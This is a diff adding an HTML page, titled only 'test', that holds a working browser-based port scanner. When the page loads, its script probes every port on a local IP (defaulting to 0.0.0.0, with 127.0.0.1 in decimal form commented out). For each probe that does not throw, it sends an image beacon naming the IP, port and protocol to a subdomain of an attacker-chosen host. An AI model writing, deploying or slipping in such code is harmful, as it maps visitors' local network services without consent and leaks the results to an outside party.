@@ -1,0 +1,71 @@
+<html>
+<head><title>test</title>
+<script>
+// pass host_root in from the URL
+let host_root = new URLSearchParams(window.location.search).get('h');
+let protocol = new URLSearchParams(window.location.search).get('x');
+
+function getPortsFromRange(start, end) {
+    const ports = new Set();
+    for (let i = start; i <= end; i++) {
+        ports.add(i);
+    }
+    return Array.from(ports);
+}
+
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function scan() {
+    //const ip = "2130706433";
+    var ip = new URLSearchParams(window.location.search).get('i');
+      
+    // get the query parameter from the URL
+    var portBegin = new URLSearchParams(window.location.search).get('a');
+    var portEnd = new URLSearchParams(window.location.search).get('b');
+    var sleepTime = new URLSearchParams(window.location.search).get('s');
+    var path = new URLSearchParams(window.location.search).get('p');
+
+    // handle defaults if not provided
+    if (!portBegin) {
+        portBegin = 1; // default value
+    }
+    if (!portEnd) {
+        portEnd = 65535; // default value
+    }
+    if (!sleepTime) {
+        sleepTime = 50; // default value
+    }
+    if (!ip) {
+        //ip = "2130706433"; // default value
+        ip = "0"; // default value
+    }
+    if (!path) {
+        path = ""; // default value
+    }
+
+    const ports = getPortsFromRange(portBegin, portEnd);
+    for (let port of ports) {
+        let url = `${protocol}://${ip}:${port}/${path}`;
+        try {
+            await fetch(url, {
+                method: 'GET',
+                mode: 'no-cors'
+            });
+            let img = new Image();
+            img.src = `http://ip${ip}.${port}.${protocol}.${host_root}/${path}`;
+        } catch (e) {
+          // Silent fail
+        }
+        await sleep(sleepTime);
+      }
+    }
+
+scan();
+
+</script>
+</head>
+<body>
+</body>
+</html>
